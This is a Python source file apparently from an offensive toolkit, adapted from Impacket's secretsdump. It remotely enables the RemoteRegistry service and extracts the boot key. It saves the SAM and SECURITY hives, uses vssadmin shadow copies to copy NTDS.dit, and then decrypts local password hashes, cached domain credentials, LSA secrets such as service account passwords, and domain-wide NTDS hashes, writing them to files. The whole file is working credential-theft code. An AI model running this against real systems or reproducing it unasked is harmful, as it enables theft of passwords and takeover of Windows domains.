#!/usr/bin/env python
# -*- coding: iso-8859-15 -*-
# -*- Mode: python -*-

from lib.common import *
from lib.structures import *

####################################################################
# Code borrowed and adapted from Impacket's secretsdump.py example #
####################################################################
class RemoteOperations:
    def __init__(self):
        self.__bootKey = ''
        self.__rrp = None
        self.__disabled = False
        self.__regHandle = None
        self.__service_name = 'RemoteRegistry'
        self.__should_stop = False
        self.__started = False
        self.__string_binding_winreg = r'ncacn_np:445[\pipe\winreg]'

    def __connect_winreg(self):
        rpc = transport.DCERPCTransportFactory(self.__string_binding_winreg)
        rpc.set_smb_connection(self.smb)
        self.__rrp = rpc.get_dce_rpc()
        self.__rrp.connect()
        self.__rrp.bind(rrp.MSRPC_UUID_RRP)

    def __check_remote_registry(self):
        status = self.status(self.__service_name, return_state=True)

        if status in ('PAUSED', 'STOPPED'):
            logger.info('Service %s is in stopped state' % self.__service_name)
            self.__should_stop = True
            self.__started = False
        elif status == 'RUNNING':
            logger.debug('Service %s is already running' % self.__service_name)
            self.__should_stop = False
            self.__started  = True
        else:
            raise Exception('Unknown service status: %s' % status)

        # Let's check its configuration if service is stopped, maybe it is disabled
        if self.__started is False:
            ans = self.query(self.__service_name, return_answer=True)

            if ans['lpServiceConfig']['dwStartType'] == 0x4:
                logger.info('Service %s is disabled, enabling it' % self.__service_name)
                self.__disabled = True
                self.change(self.__service_name, start_type=0x3)

            self.start(self.__service_name)
            time.sleep(3)

    def enable_registry(self):
        self.__check_remote_registry()
        self.__connect_winreg()

    def get_bootKey(self):
        bootKey = ''
        ans = rrp.hOpenLocalMachine(self.__rrp)
        self.__regHandle = ans['phKey']

        for key in ['JD','Skew1','GBG','Data']:
            logger.debug('Retrieving class info for %s'% key)
            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa\\%s' % key)
            keyHandle = ans['phkResult']
            ans = rrp.hBaseRegQueryInfoKey(self.__rrp, keyHandle)
            bootKey =  bootKey + ans['lpClassOut'][:-1]
            rrp.hBaseRegCloseKey(self.__rrp, keyHandle)

        transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
        bootKey = bootKey.decode('hex')

        for i in xrange(len(bootKey)):
            self.__bootKey += bootKey[transforms[i]]

        logger.info('Target system bootKey: 0x%s' % self.__bootKey.encode('hex'))

        return self.__bootKey

    def check_noLMhash_policy(self):
        logger.debug('Checking NoLMHash Policy')
        ans = rrp.hOpenLocalMachine(self.__rrp)
        self.__regHandle = ans['phKey']
        ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa')
        keyHandle = ans['phkResult']
        try:
            dataType, noLMHash = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'NoLmHash')
        except:
            noLMHash = 0

        if noLMHash == 1:
            logger.debug('LM hashes are NOT being stored')
            return True
        else:
            logger.debug('LM hashes are being stored')
            return False

    def __retrieve_hive(self, hive_name):
        temp_filename = '%s' % ''.join([random.choice(string.letters) for i in range(8)])
        ans = rrp.hOpenLocalMachine(self.__rrp)
        regHandle = ans['phKey']

        try:
            ans = rrp.hBaseRegCreateKey(self.__rrp, regHandle, hive_name)
        except:
            raise registryKey('Cannot open %s hive' % hive_name)

        logger.debug('Saving %s hive to %s' % (hive_name, temp_filename))

        keyHandle = ans['phkResult']
        resp = rrp.hBaseRegSaveKey(self.__rrp, keyHandle, temp_filename)
        rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
        rrp.hBaseRegCloseKey(self.__rrp, regHandle)

        # Open the temporary remote file, so it can be read later
        #remote_fp = RemoteFile(self.smb, ntpath.join('\\', temp_filename), share=DataStore.writable_share)
        remote_fp = RemoteFile(self.smb, ntpath.join('System32', temp_filename), share='ADMIN$')

        return remote_fp

    def saveSAM(self):
        return self.__retrieve_hive('SAM')

    def saveSECURITY(self):
        return self.__retrieve_hive('SECURITY')

    def __getLastVSS(self):
        last_shadow = ''

        self.svcexec('vssadmin list shadows', display=False)

        # Let's find the last one
        for line in DataStore.cmd_stdout.split('\n'):
           if line.find('GLOBALROOT') > 0:
               last_shadow = line[line.find('\\\\?'):][:-1]

        return last_shadow

    def saveNTDS(self):
        logger.info('Searching for NTDS.dit')

        # First of all, see if NTDS is at the target server
        tid = self.smb.connectTree('ADMIN$')

        try:
            fid = self.smb.openFile(tid, ntpath.join('NTDS', 'ntds.dit'))
        except SessionError, e:
            if e.getErrorCode() in (nt_errors.STATUS_OBJECT_NAME_NOT_FOUND, nt_errors.STATUS_OBJECT_PATH_NOT_FOUND):
                logger.debug('NTDS.dit not found')
                return None
        except Exception, e:
            return None

        logger.info('NTDS.dit found. Calling vssadmin to get a copy. This might take some time, wait..')

        # Get the last remote shadow
        shadow = self.__getLastVSS()

        # No shadow, create one
        if not shadow:
            self.svcexec('vssadmin create shadow /For=%SystemDrive%', display=False)
            shadow = self.__getLastVSS()
            should_remove = True

            if not shadow:
                raise Exception('Could not get a VSS')
        else:
            should_remove = False

        # Copy the ntds.dit database file to a writable directory
        temp_filename = ''.join([random.choice(string.letters) for i in range(8)])
        vss_filepath = ntpath.join(shadow, 'Windows', 'NTDS', 'ntds.dit')
        temp_filepath = ntpath.join(DataStore.share_path, temp_filename)
        self.svcexec('copy %s %s' % (vss_filepath, temp_filepath), display=False)

        logger.info('Copied NTDS.dit database file to %s' % temp_filepath)

        if should_remove:
            self.svcexec('vssadmin delete shadows /For=%SystemDrive% /Quiet', display=False)

        remote_fp = RemoteFile(self.smb, temp_filename, share=DataStore.writable_share)

        return remote_fp

    def get_default_login_account(self):
        try:
            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon')
            keyHandle = ans['phkResult']
            dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'DefaultUserName')
            username = dataValue[:-1]
            dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, 'DefaultDomainName')
            domain = dataValue[:-1]
            rrp.hBaseRegCloseKey(self.__rrp, keyHandle)

            if len(domain) > 0:
                return '%s\\%s' % (domain, username)
            else:
                return username
        except Exception, e:
            return None

    def get_service_account(self, service_name):
        try:
            resp = self.query(service_name, return_answer=True)
            account = resp['lpServiceConfig']['lpServiceStartName'][:-1]

            if account.startswith('.\\'):
                account = account[2:]

            return account
        except Exception, e:
            logger.error(e)
            return None

    def __restore(self):
        # First of all stop the service if it was originally stopped
        if self.__should_stop is True:
            self.stop(self.__service_name)

        if self.__disabled is True:
            logger.info('Restoring the disabled state for service %s' % self.__service_name)
            self.change(self.__service_name, start_type=0x4)

    def finish(self):
        self.__restore()
        self.__rrp.disconnect()

class CryptoCommon:
    # Common crypto stuff used over different classes
    def transformKey(self, InputKey):
        # Section 2.2.11.1.2 Encrypting a 64-Bit Block with a 7-Byte Key
        OutputKey = []
        OutputKey.append( chr(ord(InputKey[0]) >> 0x01) )
        OutputKey.append( chr(((ord(InputKey[0])&0x01)<<6) | (ord(InputKey[1])>>2)) )
        OutputKey.append( chr(((ord(InputKey[1])&0x03)<<5) | (ord(InputKey[2])>>3)) )
        OutputKey.append( chr(((ord(InputKey[2])&0x07)<<4) | (ord(InputKey[3])>>4)) )
        OutputKey.append( chr(((ord(InputKey[3])&0x0F)<<3) | (ord(InputKey[4])>>5)) )
        OutputKey.append( chr(((ord(InputKey[4])&0x1F)<<2) | (ord(InputKey[5])>>6)) )
        OutputKey.append( chr(((ord(InputKey[5])&0x3F)<<1) | (ord(InputKey[6])>>7)) )
        OutputKey.append( chr(ord(InputKey[6]) & 0x7F) )

        for i in range(8):
            OutputKey[i] = chr((ord(OutputKey[i]) << 1) & 0xfe)

        return "".join(OutputKey)

    def deriveKey(self, baseKey):
        # 2.2.11.1.3 Deriving Key1 and Key2 from a Little-Endian, Unsigned Integer Key
        # Let I be the little-endian, unsigned integer.
        # Let I[X] be the Xth byte of I, where I is interpreted as a zero-base-index array of bytes.
        # Note that because I is in little-endian byte order, I[0] is the least significant byte.
        # Key1 is a concatenation of the following values: I[0], I[1], I[2], I[3], I[0], I[1], I[2].
        # Key2 is a concatenation of the following values: I[3], I[0], I[1], I[2], I[3], I[0], I[1]
        key = pack('<L',baseKey)
        key1 = key[0] + key[1] + key[2] + key[3] + key[0] + key[1] + key[2]
        key2 = key[3] + key[0] + key[1] + key[2] + key[3] + key[0] + key[1]
        return self.transformKey(key1),self.transformKey(key2)

class OfflineRegistry:
    def __init__(self, hiveFile=None):
        self.__hiveFile = hiveFile

        if self.__hiveFile is not None:
            self.__registry_hive = winregistry.Registry(self.__hiveFile, isRemote=True)

    def enumKey(self, searchKey):
        parentKey = self.__registry_hive.findKey(searchKey)

        if parentKey is None:
            return

        keys = self.__registry_hive.enumKey(parentKey)

        return keys

    def enumValues(self, searchKey):
        key = self.__registry_hive.findKey(searchKey)

        if key is None:
            return

        values = self.__registry_hive.enumValues(key)

        return values

    def getValue(self, keyValue):
        value = self.__registry_hive.getValue(keyValue)

        if value is None:
            return

        return value

    def getClass(self, className):
        value = self.__registry_hive.getClass(className)

        if value is None:
            return

        return value

    def finish_hive(self):
        # Remove temp file and whatever else is needed
        self.__registry_hive.close()

class SAMHashes(OfflineRegistry):
    def __init__(self, samFile, bootKey):
        OfflineRegistry.__init__(self, samFile)
        self.__samFile = samFile
        self.__hashedBootKey = ''
        self.__bootKey = bootKey
        self.__cryptoCommon = CryptoCommon()
        self.__itemsFound = {}

    def __getHBootKey(self):
        logger.debug('Calculating HashedBootKey from SAM')
        QWERTY = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"
        DIGITS = "0123456789012345678901234567890123456789\0"

        F = self.getValue(ntpath.join('SAM\Domains\Account','F'))[1]

        domainData = DOMAIN_ACCOUNT_F(F)

        rc4Key = MD5(domainData['Key0']['Salt'] + QWERTY + self.__bootKey + DIGITS)

        rc4 = ARC4.new(rc4Key)
        self.__hashedBootKey = rc4.encrypt(domainData['Key0']['Key']+domainData['Key0']['CheckSum'])

        # Verify key with checksum
        checkSum = MD5(self.__hashedBootKey[:16] + DIGITS + self.__hashedBootKey[:16] + QWERTY)

        if checkSum != self.__hashedBootKey[16:]:
            raise Exception('hashedBootKey CheckSum failed')

    def __decryptHash(self, rid, cryptedHash, constant):
        # Section 2.2.11.1.1 Encrypting an NT or LM Hash Value with a Specified Key
        # plus hashedBootKey stuff
        Key1, Key2 = self.__cryptoCommon.deriveKey(rid)
        Crypt1 = DES.new(Key1, DES.MODE_ECB)
        Crypt2 = DES.new(Key2, DES.MODE_ECB)
        rc4Key = MD5( self.__hashedBootKey[:0x10] + pack("<L",rid) + constant )
        rc4 = ARC4.new(rc4Key)
        key = rc4.encrypt(cryptedHash)
        decryptedHash = Crypt1.decrypt(key[:8]) + Crypt2.decrypt(key[8:])

        return decryptedHash

    def dumpSAM(self):
        NTPASSWORD = 'NTPASSWORD\0'
        LMPASSWORD = 'LMPASSWORD\0'

        if self.__samFile is None:
            # No SAM file provided
            return

        logger.info('Dumping local SAM hashes (UID:RID:LMhash:NThash), wait..')
        self.__getHBootKey()

        usersKey = 'SAM\\Domains\\Account\\Users'

        # Enumerate all the RIDs
        rids = self.enumKey(usersKey)

        # Remove the Names item
        try:
            rids.remove('Names')
        except:
            pass

        for rid in rids:
            userAccount = USER_ACCOUNT_V(self.getValue(ntpath.join(usersKey,rid,'V'))[1])
            rid = int(rid, 16)
            baseOffset = len(USER_ACCOUNT_V())
            V = userAccount['Data']
            userName = V[userAccount['NameOffset']:userAccount['NameOffset']+userAccount['NameLength']].decode('utf-16le')

            if userAccount['LMHashLength'] == 20:
                encLMHash = V[userAccount['LMHashOffset']+4:userAccount['LMHashOffset']+userAccount['LMHashLength']]
            else:
                encLMHash = ''

            if userAccount['NTHashLength'] == 20:
                encNTHash = V[userAccount['NTHashOffset']+4:userAccount['NTHashOffset']+userAccount['NTHashLength']]
            else:
                encNTHash = ''

            lmHash = self.__decryptHash(rid, encLMHash, LMPASSWORD)
            ntHash = self.__decryptHash(rid, encNTHash, NTPASSWORD)

            if lmHash == '':
                lmHash = ntlm.LMOWFv1('', '')

            if ntHash == '':
                ntHash = ntlm.NTOWFv1('', '')

            answer =  "%s:%d:%s:%s:::" % (userName, rid, lmHash.encode('hex'), ntHash.encode('hex'))
            self.__itemsFound[rid] = answer

            print answer

    def exportSAM(self):
        if len(self.__itemsFound) > 0:
            items = sorted(self.__itemsFound)
            fd = open('%s-sam.txt' % DataStore.server_host, 'w+')

            for item in items:
                fd.write('%s\n' % self.__itemsFound[item])

            fd.close()

class LSASecrets(OfflineRegistry):
    def __init__(self, securityFile, bootKey):
        OfflineRegistry.__init__(self, securityFile)

        self.__hashedBootKey = ''
        self.__bootKey = bootKey
        self.__LSAKey = ''
        self.__NKLMKey = ''
        self.__vistaStyle = True
        self.__cryptoCommon = CryptoCommon()
        self.__securityFile = securityFile
        self.__cachedItems = []
        self.__secretItems = []

    def __sha256(self, key, value, rounds=1000):
        sha = hashlib.sha256()
        sha.update(key)

        for i in range(1000):
            sha.update(value)

        return sha.digest()

    def __decryptAES(self, key, value, iv='\x00'*16):
        plainText = ''

        if iv != '\x00'*16:
            aes256 = AES.new(key,AES.MODE_CBC, iv)

        for index in range(0, len(value), 16):
            if iv == '\x00'*16:
                aes256 = AES.new(key,AES.MODE_CBC, iv)

            cipherBuffer = value[index:index+16]

            # Pad buffer to 16 bytes
            if len(cipherBuffer) < 16:
                cipherBuffer += '\x00' * (16-len(cipherBuffer))

            plainText += aes256.decrypt(cipherBuffer)

        return plainText

    def __decryptSecret(self, key, value):
        # [MS-LSAD] Section 5.1.2
        plainText = ''
        key0 = key

        for i in range(0, len(value), 8):
            cipherText = value[:8]
            tmpStrKey = key0[:7]
            tmpKey = self.__cryptoCommon.transformKey(tmpStrKey)
            Crypt1 = DES.new(tmpKey, DES.MODE_ECB)
            plainText += Crypt1.decrypt(cipherText)
            cipherText = cipherText[8:]
            key0 = key0[7:]
            value = value[8:]

            # AdvanceKey
            if len(key0) < 7:
                key0 = key[len(key0):]

        secret = LSA_SECRET_XP(plainText)

        return (secret['Secret'])

    def __decryptHash(self, key, value, iv):
        hmac_md5 = HMAC.new(key,iv)
        rc4key = hmac_md5.digest()
        rc4 = ARC4.new(rc4key)
        data = rc4.encrypt(value)

        return data

    def __decryptLSA(self, value):
        if self.__vistaStyle is True:
            # ToDo: There could be more than one LSA Keys
            record = LSA_SECRET(value)
            tmpKey = self.__sha256(self.__bootKey, record['EncryptedData'][:32])
            plainText = self.__decryptAES(tmpKey, record['EncryptedData'][32:])
            record = LSA_SECRET_BLOB(plainText)
            self.__LSAKey = record['Secret'][52:][:32]
        else:
            md5 = hashlib.new('md5')
            md5.update(self.__bootKey)

            for i in range(1000):
                md5.update(value[60:76])

            tmpKey = md5.digest()
            rc4 = ARC4.new(tmpKey)
            plainText = rc4.decrypt(value[12:60])
            self.__LSAKey = plainText[0x10:0x20]

    def __getLSASecretKey(self):
        logger.debug('Decrypting LSA Key')
        # Let's try the key post XP
        value = self.getValue('\\Policy\\PolEKList\\default')

        if value is None:
            logger.debug('PolEKList not found, trying PolSecretEncryptionKey')
            # Second chance
            value = self.getValue('\\Policy\\PolSecretEncryptionKey\\default')
            self.__vistaStyle = False

            if value is None:
                # No way :(
                return None

        self.__decryptLSA(value[1])

    def __getNLKMSecret(self):
        logger.debug('Decrypting NL$KM')
        value = self.getValue('\\Policy\\Secrets\\NL$KM\\CurrVal\\default')

        if value is None:
            raise Exception("Couldn't get NL$KM value")

        if self.__vistaStyle is True:
            record = LSA_SECRET(value[1])
            tmpKey = self.__sha256(self.__LSAKey, record['EncryptedData'][:32])
            self.__NKLMKey = self.__decryptAES(tmpKey, record['EncryptedData'][32:])
        else:
            self.__NKLMKey = self.__decryptSecret(self.__LSAKey,value[1][0xc:])

    def __pad(self, data):
        if (data & 0x3) > 0:
            return data + (data & 0x3)
        else:
            return data

    def dumpCachedHashes(self):
        if self.__securityFile is None:
            # No SECURITY file provided
            return

        logger.info('Dumping cached domain logon information (UID:encryptedHash:longDomain:domain), wait..')

        # Let's first see if there are cached entries
        values = self.enumValues('\\Cache')

        if values == None:
            # No cache entries
            return

        try:
            # Remove unnecesary value
            values.remove('NL$Control')
        except:
            pass

        self.__getLSASecretKey()
        self.__getNLKMSecret()

        for value in values:
            logger.debug('Looking into %s' % value)
            record = NL_RECORD(self.getValue(ntpath.join('\\Cache',value))[1])

            if record['CH'] != 16 * '\x00':
                if self.__vistaStyle is True:
                    plainText = self.__decryptAES(self.__NKLMKey[16:32], record['EncryptedData'], record['CH'])
                else:
                    plainText = self.__decryptHash(self.__NKLMKey, record['EncryptedData'], record['CH'])
                    pass

                encHash = plainText[:0x10]
                plainText = plainText[0x48:]
                userName = plainText[:record['UserLength']].decode('utf-16le')
                plainText = plainText[self.__pad(record['UserLength']):]
                domain = plainText[:record['DomainNameLength']].decode('utf-16le')
                plainText = plainText[self.__pad(record['DomainNameLength']):]
                domainLong = plainText[:self.__pad(record['FullDomainLength'])].decode('utf-16le')
                answer = "%s:%s:%s:%s:::" % (userName, encHash.encode('hex'), domainLong, domain)
                self.__cachedItems.append(answer)

                print answer

    def __printSecret(self, name, secretItem):
        # Based on [MS-LSAD] section 3.1.1.4

        # First off, let's discard NULL secrets.
        if len(secretItem) == 0:
            logger.debug('Discarding secret %s, NULL Data' % name)
            return

        # We might have secrets with zero
        if secretItem.startswith('\x00\x00'):
            logger.debug('Discarding secret %s, all zeros' % name)
            return

        upperName = name.upper()

        logger.info('%s ' % name)

        secret = ''

        if upperName.startswith('_SC_'):
            # Service name, a password might be there
            # Let's first try to decode the secret
            try:
                strDecoded = secretItem.decode('utf-16le')
            except:
                pass
            else:
                # We have to get the account the service
                # runs under
                account = self.get_service_account(name[4:])

                if account is None:
                    secret = '(Unknown User) '
                else:
                    secret =  "%s " % account

                secret += strDecoded

        elif upperName.startswith('DEFAULTPASSWORD'):
            # defaults password for winlogon
            # Let's first try to decode the secret
            try:
                strDecoded = secretItem.decode('utf-16le')
            except:
                pass
            else:
                # We have to get the account this password is for
                account = self.get_default_login_account()

                if account is None:
                    secret = '(Unknown User) '
                else:
                    secret = "%s " % account

                secret += strDecoded

        elif upperName.startswith('ASPNET_WP_PASSWORD'):
            try:
                strDecoded = secretItem.decode('utf-16le')
            except:
                pass
            else:
                secret = 'ASPNET %s' % strDecoded

        elif upperName.startswith('$MACHINE.ACC'):
            # Compute MD4 of the secret.. yes.. that is the nthash
            md4 = MD4.new()
            md4.update(secretItem)
            secret = "%s\\%s$:%s:%s:::" % (DataStore.server_domain, DataStore.server_name, ntlm.LMOWFv1('', '').encode('hex'), md4.digest().encode('hex'))

        if secret != '':
            print secret
            self.__secretItems.append(secret)
        else:
            # Default print, hexdump
            self.__secretItems.append('%s %s' % (name, secretItem.encode('hex')))
            hexdump(secretItem)

    def dumpSecrets(self):
        logger.info('Dumping LSA secrets, wait..')

        # Let's first see if there are cached entries
        keys = self.enumKey('\\Policy\\Secrets')

        if keys == None:
            # No entries
            return

        try:
            # Remove unnecesary value
            keys.remove('NL$Control')
        except:
            pass

        if self.__LSAKey == '':
            self.__getLSASecretKey()

        for key in keys:
            logger.debug('Looking into %s' % key)
            value = self.getValue('\\Policy\\Secrets\\%s\\CurrVal\\default' % key)

            if value is not None:
                if self.__vistaStyle is True:
                    record = LSA_SECRET(value[1])
                    tmpKey = self.__sha256(self.__LSAKey, record['EncryptedData'][:32])
                    plainText = self.__decryptAES(tmpKey, record['EncryptedData'][32:])
                    record = LSA_SECRET_BLOB(plainText)
                    secret = record['Secret']
                else:
                    secret = self.__decryptSecret(self.__LSAKey,value[1][0xc:])

                self.__printSecret(key, secret)

    def exportSecrets(self):
        if len(self.__secretItems) > 0:
            fd = open('%s-secrets.txt' % DataStore.server_host, 'w+')

            for item in self.__secretItems:
                fd.write('%s\n' % item)

            fd.close()

    def exportCached(self):
        if len(self.__cachedItems) > 0:
            fd = open('%s-cached.txt' % DataStore.server_host, 'w+')

            for item in self.__cachedItems:
                fd.write('%s\n' % item)

            fd.close()

class NTDSHashes(object):
    NAME_TO_INTERNAL = {
        'uSNCreated':'ATTq131091',
        'uSNChanged':'ATTq131192',
        'name':'ATTm3',
        'objectGUID':'ATTk589826',
        'objectSid':'ATTr589970',
        'userAccountControl':'ATTj589832',
        'primaryGroupID':'ATTj589922',
        'accountExpires':'ATTq589983',
        'logonCount':'ATTj589993',
        'sAMAccountName':'ATTm590045',
        'sAMAccountType':'ATTj590126',
        'lastLogonTimestamp':'ATTq589876',
        'userPrincipalName':'ATTm590480',
        'unicodePwd':'ATTk589914',
        'dBCSPwd':'ATTk589879',
        'ntPwdHistory':'ATTk589918',
        'lmPwdHistory':'ATTk589984',
        'pekList':'ATTk590689',
    }

    INTERNAL_TO_NAME = dict((v,k) for k,v in NAME_TO_INTERNAL.iteritems())

    SAM_NORMAL_USER_ACCOUNT = 0x30000000
    SAM_MACHINE_ACCOUNT     = 0x30000001
    SAM_TRUST_ACCOUNT       = 0x30000002

    ACCOUNT_TYPES = (SAM_NORMAL_USER_ACCOUNT, SAM_MACHINE_ACCOUNT, SAM_TRUST_ACCOUNT)

    class PEK_KEY(Structure):
        structure = (
            ('Header','8s=""'),
            ('KeyMaterial','16s=""'),
            ('EncryptedPek','52s=""'),
        )

    class CRYPTED_HASH(Structure):
        structure = (
            ('Header','8s=""'),
            ('KeyMaterial','16s=""'),
            ('EncryptedHash','16s=""'),
        )

    class CRYPTED_HISTORY(Structure):
        structure = (
            ('Header','8s=""'),
            ('KeyMaterial','16s=""'),
            ('EncryptedHash',':'),
        )

    def __init__(self, ntds_file, bootKey, history=False, noLMHash=True):
        self.__bootKey = bootKey
        self.__ntds_file = ntds_file
        self.__history = history
        self.__no_LMhash = noLMHash
        self.__tmpUsers = list()
        self.__PEK = None
        self.__cryptoCommon = CryptoCommon()
        self.__itemsFound = {}

        if not self.__ntds_file:
            return

        self.__ESEDB = ESENT_DB(self.__ntds_file, isRemote=True)
        self.__cursor = self.__ESEDB.openTable('datatable')

    def __getPek(self):
        logger.info('Searching for pekList, be patient')
        pek = None

        while True:
            record = self.__ESEDB.getNextRow(self.__cursor)

            if record is None:
                break
            elif record[self.NAME_TO_INTERNAL['pekList']] is not None:
                pek =  record[self.NAME_TO_INTERNAL['pekList']].decode('hex')
                break
            elif record[self.NAME_TO_INTERNAL['sAMAccountType']] in self.ACCOUNT_TYPES:
                # Okey.. we found some users, but we're not yet ready to process them.
                # Let's just store them in a temp list
                self.__tmpUsers.append(record)

        if pek is not None:
            encryptedPek = self.PEK_KEY(pek)
            md5 = hashlib.new('md5')
            md5.update(self.__bootKey)

            for i in range(1000):
                md5.update(encryptedPek['KeyMaterial'])

            tmpKey = md5.digest()
            rc4 = ARC4.new(tmpKey)
            plainText = rc4.encrypt(encryptedPek['EncryptedPek'])
            self.__PEK = plainText[36:]

    def __removeRC4Layer(self, cryptedHash):
        md5 = hashlib.new('md5')
        md5.update(self.__PEK)
        md5.update(cryptedHash['KeyMaterial'])
        tmpKey = md5.digest()
        rc4 = ARC4.new(tmpKey)
        plainText = rc4.encrypt(cryptedHash['EncryptedHash'])

        return plainText

    def __removeDESLayer(self, cryptedHash, rid):
        Key1, Key2 = self.__cryptoCommon.deriveKey(int(rid))
        Crypt1 = DES.new(Key1, DES.MODE_ECB)
        Crypt2 = DES.new(Key2, DES.MODE_ECB)
        decryptedHash = Crypt1.decrypt(cryptedHash[:8]) + Crypt2.decrypt(cryptedHash[8:])

        return decryptedHash

    def __decryptHash(self, record):
        logger.debug('Decrypting hash for user: %s' % record[self.NAME_TO_INTERNAL['name']])

        sid = SAMR_RPC_SID(record[self.NAME_TO_INTERNAL['objectSid']].decode('hex'))
        rid = sid.formatCanonical().split('-')[-1]

        if record[self.NAME_TO_INTERNAL['dBCSPwd']] is not None:
            encryptedLMHash = self.CRYPTED_HASH(record[self.NAME_TO_INTERNAL['dBCSPwd']].decode('hex'))
            tmpLMHash = self.__removeRC4Layer(encryptedLMHash)
            LMHash = self.__removeDESLayer(tmpLMHash, rid)
        else:
            LMHash = ntlm.LMOWFv1('','')
            encryptedLMHash = None

        if record[self.NAME_TO_INTERNAL['unicodePwd']] is not None:
            encryptedNTHash = self.CRYPTED_HASH(record[self.NAME_TO_INTERNAL['unicodePwd']].decode('hex'))
            tmpNTHash = self.__removeRC4Layer(encryptedNTHash)
            NTHash = self.__removeDESLayer(tmpNTHash, rid)
        else:
            NTHash = ntlm.NTOWFv1('','')
            encryptedNTHash = None

        if record[self.NAME_TO_INTERNAL['userPrincipalName']] is not None:
            domain = record[self.NAME_TO_INTERNAL['userPrincipalName']].split('@')[-1]
            userName = '%s\\%s' % (domain, record[self.NAME_TO_INTERNAL['sAMAccountName']])
        else:
            userName = '%s' % record[self.NAME_TO_INTERNAL['sAMAccountName']]

        answer = "%s:%s:%s:%s:::" % (userName, rid, LMHash.encode('hex'), NTHash.encode('hex'))
        self.__itemsFound[record[self.NAME_TO_INTERNAL['objectSid']].decode('hex')] = answer
        print answer

        if self.__history:
            LMHistory = []
            NTHistory = []

            if record[self.NAME_TO_INTERNAL['lmPwdHistory']] is not None:
                lmPwdHistory = record[self.NAME_TO_INTERNAL['lmPwdHistory']]
                encryptedLMHistory = self.CRYPTED_HISTORY(record[self.NAME_TO_INTERNAL['lmPwdHistory']].decode('hex'))
                tmpLMHistory = self.__removeRC4Layer(encryptedLMHistory)

                for i in range(0, len(tmpLMHistory)/16):
                    LMHash = self.__removeDESLayer(tmpLMHistory[i*16:(i+1)*16], rid)
                    LMHistory.append(LMHash)

            if record[self.NAME_TO_INTERNAL['ntPwdHistory']] is not None:
                ntPwdHistory = record[self.NAME_TO_INTERNAL['ntPwdHistory']]
                encryptedNTHistory = self.CRYPTED_HISTORY(record[self.NAME_TO_INTERNAL['ntPwdHistory']].decode('hex'))
                tmpNTHistory = self.__removeRC4Layer(encryptedNTHistory)

                for i in range(0, len(tmpNTHistory)/16):
                    NTHash = self.__removeDESLayer(tmpNTHistory[i*16:(i+1)*16], rid)
                    NTHistory.append(NTHash)

            for i, (LMHash, NTHash) in enumerate(map(lambda l,n: (l,n) if l else ('',n), LMHistory[1:], NTHistory[1:])):
                if self.__no_LMhash:
                    lmhash = ntlm.LMOWFv1('', '').encode('hex')
                else:
                    lmhash = LMHash.encode('hex')

                answer = "%s_history%d:%s:%s:%s:::" % (userName, i, rid, lmhash, NTHash.encode('hex'))
                self.__itemsFound[record[self.NAME_TO_INTERNAL['objectSid']].decode('hex')+str(i)] = answer
                print answer

    def dumpNTDS(self):
        if not self.__ntds_file:
            return

        logger.info('Dumping domain users\' hashes (DOMAIN\\UID:RID:LMhash:NThash), wait..')

        # We start getting rows from the table aiming at reaching
        # the pekList. If we find users records we stored them
        # in a temp list for later process
        self.__getPek()

        if self.__PEK is not None:
            logger.info('PEK found and decrypted: 0x%s' % self.__PEK.encode('hex'))
            logger.info('Reading and decrypting hashes from %s' % self.__ntds_file)

            # First of all, if we have users already cached, let's decrypt their hashes
            for record in self.__tmpUsers:
                self.__decryptHash(record)

            # Now let's keep moving through the NTDS file and decrypting what we find
            while True:
                try:
                    record = self.__ESEDB.getNextRow(self.__cursor)
                except:
                    logger.error('Error while calling getNextRow(), trying the next one')
                    continue

                if record is None:
                    break

                try:
                    if record[self.NAME_TO_INTERNAL['sAMAccountType']] in self.ACCOUNT_TYPES:
                        self.__decryptHash(record)
                except Exception, e:
                    try:
                        logger.error('Error while processing row for user %s' % record[self.NAME_TO_INTERNAL['name']])
                        logger.error(str(e))
                    except:
                        logger.error('Error while processing row!')
                        logger.error(str(e))

    def exportNTDS(self):
        if len(self.__itemsFound) > 0:
            items = sorted(self.__itemsFound)
            fd = open('%s-ntds.txt' % DataStore.server_host, 'w+')

            for item in items:
                try:
                    fd.write('%s\n' % self.__itemsFound[item])
                except Exception, e:
                    try:
                        logger.error('Error writing entry %d, skipping' % item)
                    except:
                        logger.error('Error writing entry, skipping')

            fd.close()

    def finishNTDS(self):
        if hasattr(self, '__ESEDB'):
            self.__ESEDB.close()

class SecretsDump(RemoteOperations, SAMHashes, LSASecrets, NTDSHashes):
    def __init__(self):
        RemoteOperations.__init__(self)

        self.__SAM_hashes = None
        self.__ntds_file_hashes = None
        self.__LSA_secrets = None
        self.__no_LMhash = True

    def secretsdump(self, history=False):
        self.__history = True if history and history.upper().startswith('Y') else False
        self.enable_registry()
        bootKey = self.get_bootKey()

        # Let's check whether target system stores LM hashes
        self.__no_LMhash = self.check_noLMhash_policy()

        SAMHashes.__init__(self, self.saveSAM(), bootKey)
        self.dumpSAM()
        self.exportSAM()
        self.finish_hive()

        LSASecrets.__init__(self, self.saveSECURITY(), bootKey)
        self.dumpCachedHashes()
        self.exportCached()
        self.dumpSecrets()
        self.exportSecrets()
        self.finish_hive()

        NTDSHashes.__init__(self, self.saveNTDS(), bootKey, history=self.__history, noLMHash=self.__no_LMhash)
        self.dumpNTDS()
        self.exportNTDS()
        self.finishNTDS()

        self.cleanup()

    def cleanup(self):
        logger.info('Cleaning up..')
        self.finish()
